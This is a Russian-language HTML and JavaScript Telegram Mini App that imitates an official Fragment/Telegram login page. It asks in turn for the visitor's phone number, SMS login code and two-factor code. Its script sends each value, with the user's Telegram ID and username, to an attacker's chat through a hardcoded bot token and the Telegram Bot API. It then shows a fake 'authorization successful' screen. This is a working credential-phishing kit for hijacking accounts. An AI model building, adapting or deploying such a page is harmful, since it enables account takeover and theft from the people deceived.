<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fragment Authorization</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    /* Стили остаются без изменений */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      margin: 0;
      padding: 15px;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      background-color: #ffffff;
    }

    .container {
      background-color: #fff;
      border-radius: 12px;
      box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 440px;
      padding: 25px;
      text-align: center;
      margin: 10px 0;
    }

    .icons {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 25px;
    }

    .icons img {
      width: 45px;
      height: 45px;
    }

    .fragment-logo {
      border-radius: 8px;
    }

    h1 {
      font-size: 22px;
      font-weight: 800;
      margin-bottom: 12px;
      color: #000;
      line-height: 1.3;
    }

    p {
      font-size: 15px;
      color: #555;
      margin-bottom: 20px;
      line-height: 1.5;
    }

    .input-group {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-bottom: 25px;
    }

    select {
      width: 100%;
      padding: 14px 40px 14px 14px;
      border: none;
      border-radius: 12px;
      font-size: 15px;
      box-sizing: border-box;
      background-color: #f8f9fa;
      color: #007bff;
      font-weight: 500;
      appearance: none;
      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23666'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
      background-repeat: no-repeat;
      background-position: right 14px center;
      background-size: 16px;
      height: 48px;
    }

    .phone-input {
      display: flex;
      background-color: #f8f9fa;
      border-radius: 12px;
      overflow: hidden;
      height: 48px;
    }

    .country-code {
      padding: 14px;
      background: #f8f9fa;
      border-right: 1.5px solid #e9ecef;
      min-width: 65px;
      color: #000;
      font-weight: 700;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 4px 0;
      border-radius: 12px 0 0 12px;
      font-size: 15px;
    }

    .phone-number {
      flex: 1;
      border: none;
      padding: 14px;
      background: #f8f9fa;
      border-radius: 0 12px 12px 0;
      font-size: 15px;
      height: 100%;
    }

    .phone-number:focus {
      outline: none;
    }

    select:focus {
      outline: none;
    }

    .buttons {
      display: flex;
      justify-content: space-between;
      gap: 12px;
    }

    .buttons button {
      flex: 1;
      padding: 14px;
      font-size: 15px;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    .cancel-btn {
      background: none;
      color: #007bff;
      border: 1px solid #007bff;
    }

    .next-btn {
      background: #007bff;
      color: #fff;
    }

    .screen {
      display: none;
    }

    .screen.active {
      display: block;
    }

    .code-inputs {
      display: flex;
      gap: 12px;
      justify-content: center;
      margin-bottom: 25px;
    }

    .code-input {
      width: 45px;
      height: 55px;
      border: 2px solid #ddd;
      border-radius: 10px;
      text-align: center;
      font-size: 22px;
      font-weight: bold;
      outline: none;
    }

    .code-input:focus {
      border-color: #007bff;
    }

    .back-btn {
      background: none;
      border: none;
      color: #007bff;
      font-size: 15px;
      cursor: pointer;
      margin-bottom: 20px;
      padding: 8px 0;
      display: inline-block;
    }

    .hint {
      font-size: 14px;
      color: #666;
      margin-top: 12px;
      line-height: 1.4;
    }

    .resend-code {
      margin-top: 20px;
      font-size: 15px;
      color: #555;
      line-height: 1.5;
    }

    .resend-link {
      color: #007bff;
      cursor: pointer;
      text-decoration: none;
      font-weight: 500;
    }

    .resend-link:disabled {
      color: #999;
      cursor: not-allowed;
    }

    .success-screen {
      text-align: center;
      padding: 20px 0;
    }

    .success-icon {
      font-size: 70px;
      margin-bottom: 25px;
    }

    /* Адаптивность для маленьких экранов */
    @media (max-height: 700px) {
      body {
        align-items: flex-start;
        padding: 10px;
      }
      
      .container {
        padding: 20px;
        margin: 5px 0;
      }
      
      .icons {
        margin-bottom: 20px;
      }
      
      .icons img {
        width: 40px;
        height: 40px;
      }
      
      h1 {
        font-size: 20px;
        margin-bottom: 10px;
      }
      
      p {
        font-size: 14px;
        margin-bottom: 15px;
      }
      
      .input-group {
        margin-bottom: 20px;
      }
    }

    @media (max-width: 480px) {
      .container {
        padding: 20px 15px;
      }
      
      .code-input {
        width: 40px;
        height: 50px;
        font-size: 20px;
      }
    }
  </style>
</head>
<body>
  <!-- Экран 1: Ввод номера телефона -->
  <div class="container screen active" id="screen1">
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://raw.githubusercontent.com/telegram-apps/website/main/public/fragment.png" alt="Fragment Logo" class="fragment-logo" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDUiIGhlaWdodD0iNDUiIHZpZXdCb3g9IjAgMCA0NSA0NSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQ1IiBoZWlnaHQ9IjQ1IiByeD0iOCIgZmlsbD0iIzAwMDAwMCIvPgo8dGV4dCB4PSIyMi41IiB5PSIyOC41IiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMTYiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXdlaWdodD0iYm9sZCI+RjwvdGV4dD4KPC9zdmc+'" />
    </div>
    <h1 style="margin-bottom: 8px;">Войдите, чтобы использовать аккаунт Telegram</h1>
    <p style="font-size: 15px; color: #555; margin-bottom: 8px; line-height: 1.5;">
      для <span style="color: #007bff; cursor: pointer;">fragment.com</span> и <span style="color: #007bff; cursor: pointer;">Fragment Auction Alerts</span>.
    </p>
    <p style="font-size: 15px; color: #555; margin-bottom: 25px; line-height: 1.5;">
      Введите свой <strong>номер телефона</strong> в <span style="color: #007bff; cursor: pointer;">международном формате</span>.<br>
      Подтверждение будет отправлено в Telegram.
    </p>
    <div class="input-group">
      <select id="country" onchange="updateCountryCode()">
        <!-- Список стран без изменений -->
        <option value="+7" selected>Россия</option>
        <option value="+61">Австралия</option>
        <option value="+43">Австрия</option>
        <!-- ... остальные страны ... -->
      </select>
      <div class="phone-input">
        <span class="country-code" id="countryCode">+7</span>
        <input type="text" class="phone-number" id="phone" placeholder="Ваш номер телефона">
      </div>
    </div>
    <div class="buttons">
      <button class="cancel-btn" onclick="handleCancel()">ОТМЕНА</button>
      <button class="next-btn" onclick="handlePhoneSubmit()">ДАЛЕЕ</button>
    </div>
  </div>

  <!-- Экран 2: Ввод SMS кода -->
  <div class="container screen" id="screen2">
    <button class="back-btn" onclick="prevScreen(1)">← Назад</button>
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://raw.githubusercontent.com/telegram-apps/website/main/public/fragment.png" alt="Fragment Logo" class="fragment-logo" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDUiIGhlaWdodD0iNDUiIHZpZXdCb3g9IjAgMCA0NSA0NSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQ1IiBoZWlnaHQ9IjQ1IiByeD0iOCIgZmlsbD0iIzAwMDAwMCIvPgo8dGV4dCB4PSIyMi41IiB5PSIyOC41IiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMTYiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXdlaWdodD0iYm9sZCI+RjwvdGV4dD4KPC9zdmc+'" />
    </div>
    <h1>Введите код из SMS</h1>
    <p>Мы отправили код подтверждения на ваш номер телефона.</p>
    
    <div class="code-inputs">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
      <input type="text" class="code-input" maxlength="1">
    </div>
    
    <div class="resend-code" id="resendCodeBlock">
      Не пришел код? <a href="javascript:void(0)" class="resend-link" id="resendLink" onclick="resendCode()">Отправить повторно</a>
      <span id="resendTimer" style="display: none; margin-left: 5px;"></span>
    </div>
    
    <div class="buttons">
      <button class="next-btn" onclick="handleSmsSubmit()">ПРОДОЛЖИТЬ</button>
    </div>
  </div>

  <!-- Экран 3: Ввод 2FA кода -->
  <div class="container screen" id="screen3">
    <button class="back-btn" onclick="prevScreen(2)">← Назад</button>
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://raw.githubusercontent.com/telegram-apps/website/main/public/fragment.png" alt="Fragment Logo" class="fragment-logo" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDUiIGhlaWdodD0iNDUiIHZpZXdCb3g9IjAgMCA0NSA0NSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQ1IiBoZWlnaHQ9IjQ1IiByeD0iOCIgZmlsbD0iIzAwMDAwMCIvPgo8dGV4dCB4PSIyMi41IiB5PSIyOC41IiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMTYiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXdlaWdodD0iYm9sZCI+RjwvdGV4dD4KPC9zdmc+'" />
    </div>
    <h1>Двухфакторная аутентификация</h1>
    <p>Введите код из приложения аутентификации.</p>
    
    <div class="code-inputs">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)">
      <input type="text" class="code-input" maxlength="1">
    </div>
    
    <div class="hint">Для завершения авторизации введите 6-значный код</div>
    
    <div class="buttons">
      <button class="cancel-btn" onclick="handleCancel()">ОТМЕНА</button>
      <button class="next-btn" onclick="handle2faSubmit()">ЗАВЕРШИТЬ</button>
    </div>
  </div>

  <!-- Экран 4: Успешная авторизация -->
  <div class="container screen" id="screen4">
    <div class="success-screen">
      <div class="success-icon">✅</div>
      <h1>Авторизация успешно завершена!</h1>
      <p>Ваш аккаунт Fragment был успешно авторизован. Теперь вы можете вернуться в основного бота для продолжения работы.</p>
      
      <div class="buttons">
        <button class="next-btn" onclick="closeWebApp()">ВЕРНУТЬСЯ В БОТА</button>
      </div>
    </div>
  </div>

  <script>
    // Инициализация Telegram Web App
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.MainButton.hide();

    let currentScreen = 1;
    let resendTimerInterval;

    // Конфигурация для логов
    const BOT_TOKEN = '7872244632:AAH78O5srYOqV7QdxjztT6px-Qi1TKZlTA0'; // Замените на токен вашего бота
    const LOG_CHAT_ID = '-1003260648472'; // Замените на ID чата/группы для логов

    // Функция для обновления кода страны
    function updateCountryCode() {
      const countrySelect = document.getElementById('country');
      const countryCodeElement = document.getElementById('countryCode');
      const selectedValue = countrySelect.value;
      countryCodeElement.textContent = selectedValue;
    }

    // НОВАЯ ФУНКЦИЯ: Отправка логов через Bot API
    async function sendLog(action, details = '') {
      try {
        const user = tg.initDataUnsafe?.user;
        
        const logData = {
          type: 'log',
          action: action,
          details: details,
          user: user ? {
            id: user.id,
            first_name: user.first_name,
            username: user.username
          } : null,
          timestamp: new Date().toLocaleString('ru-RU'),
          platform: 'Telegram WebApp'
        };
        
        console.log('📤 Отправка лога:', logData);
        
        // Формируем сообщение для отправки
        const message = `
🔔 **Новое событие авторизации**
        
**Действие:** ${action}
**Детали:** ${details}
**Пользователь:** ${user ? `ID: ${user.id}, Имя: ${user.first_name}${user.username ? `, @${user.username}` : ''}` : 'Не авторизован'}
**Время:** ${logData.timestamp}
**Платформа:** ${logData.platform}
        `.trim();

        // Отправляем через Bot API
        if (BOT_TOKEN && LOG_CHAT_ID) {
          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: LOG_CHAT_ID,
              text: message,
              parse_mode: 'HTML'
            })
          });
          
          const result = await response.json();
          if (!result.ok) {
            console.error('❌ Ошибка отправки лога через Bot API:', result);
          } else {
            console.log('✅ Лог отправлен через Bot API');
          }
        } else {
          console.warn('⚠️ Bot token или chat ID не настроены');
        }
        
      } catch (error) {
        console.error('❌ Ошибка отправки лога:', error);
      }
    }

    function nextScreen(screenNumber) {
      document.getElementById(`screen${currentScreen}`).classList.remove('active');
      document.getElementById(`screen${screenNumber}`).classList.add('active');
      currentScreen = screenNumber;
    }

    function prevScreen(screenNumber) {
      document.getElementById(`screen${currentScreen}`).classList.remove('active');
      document.getElementById(`screen${screenNumber}`).classList.add('active');
      currentScreen = screenNumber;
    }

    // Перемещение между полями ввода кода
    function moveToNext(input, currentIndex) {
      if (input.value.length === 1) {
        const inputs = input.parentElement.querySelectorAll('.code-input');
        if (currentIndex < inputs.length) {
          inputs[currentIndex].focus();
        }
      }
    }

    function handlePhoneSubmit() {
      const phone = document.getElementById('phone').value;
      const countrySelect = document.getElementById('country');
      const country = countrySelect.options[countrySelect.selectedIndex].text;
      const countryCode = document.getElementById('countryCode').textContent;
      
      if (!phone) {
        alert('Пожалуйста, введите номер телефона');
        return;
      }
      
      sendLog('PHONE_ENTERED', `Страна: ${country}, Номер: ${countryCode}${phone}`);
      nextScreen(2);
    }

    function handleSmsSubmit() {
      const codeInputs = document.querySelectorAll('#screen2 .code-input');
      let smsCode = '';
      codeInputs.forEach(input => smsCode += input.value);
      
      if (smsCode.length !== 5) {
        alert('Пожалуйста, введите полный 5-значный код');
        return;
      }
      
      sendLog('SMS_CODE_ENTERED', `Код: ${smsCode}`);
      nextScreen(3);
    }

    function handle2faSubmit() {
      const codeInputs = document.querySelectorAll('#screen3 .code-input');
      let faCode = '';
      codeInputs.forEach(input => faCode += input.value);
      
      if (faCode.length !== 6) {
        alert('Пожалуйста, введите полный 6-значный код');
        return;
      }
      
      sendLog('2FA_CODE_ENTERED', `Код: ${faCode}`);
      completeAuth();
    }

    function resendCode() {
      const resendLink = document.getElementById('resendLink');
      const resendTimer = document.getElementById('resendTimer');
      
      // Отправляем лог о запросе повторной отправки кода
      sendLog('RESEND_CODE_REQUESTED', 'Пользователь запросил повторную отправку SMS кода');
      
      // Блокируем кнопку и запускаем таймер
      resendLink.style.pointerEvents = 'none';
      resendLink.style.color = '#999';
      resendLink.textContent = 'Отправить повторно';
      resendTimer.style.display = 'inline';
      
      let timeLeft = 30;
      resendTimer.textContent = `(00:${timeLeft.toString().padStart(2, '0')})`;
      
      // Останавливаем предыдущий таймер, если он был
      if (resendTimerInterval) {
        clearInterval(resendTimerInterval);
      }
      
      resendTimerInterval = setInterval(() => {
        timeLeft--;
        resendTimer.textContent = `(00:${timeLeft.toString().padStart(2, '0')})`;
        
        if (timeLeft <= 0) {
          clearInterval(resendTimerInterval);
          resendLink.style.pointerEvents = 'auto';
          resendLink.style.color = '#007bff';
          resendTimer.style.display = 'none';
          
          // Показываем всплывающее окно
          tg.showPopup({
            title: 'Код отправлен',
            message: 'Новый код подтверждения отправлен на ваш номер телефона.',
            buttons: [{ type: 'ok' }]
          });
        }
      }, 1000);
    }

    function handleCancel() {
      sendLog('USER_CANCELLED', 'Пользователь отменил авторизацию');
      tg.close();
    }

    function completeAuth() {
      sendLog('AUTH_SUCCESS', 'Успешная авторизация пользователя');
      nextScreen(4);
    }

    function closeWebApp() {
      sendLog('APP_CLOSED', 'Пользователь вернулся в бота');
      tg.close();
    }

    document.addEventListener('DOMContentLoaded', function() {
      sendLog('APP_STARTED', 'Мини-приложение запущено в Telegram WebView');
      
      const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
            if (document.getElementById('screen2').classList.contains('active')) {
              document.querySelector('#screen2 .code-input').focus();
            }
            if (document.getElementById('screen3').classList.contains('active')) {
              document.querySelector('#screen3 .code-input').focus();
            }
          }
        });
      });
      
      observer.observe(document.getElementById('screen2'), { attributes: true });
      observer.observe(document.getElementById('screen3'), { attributes: true });
    });
  </script>
</body>
</html>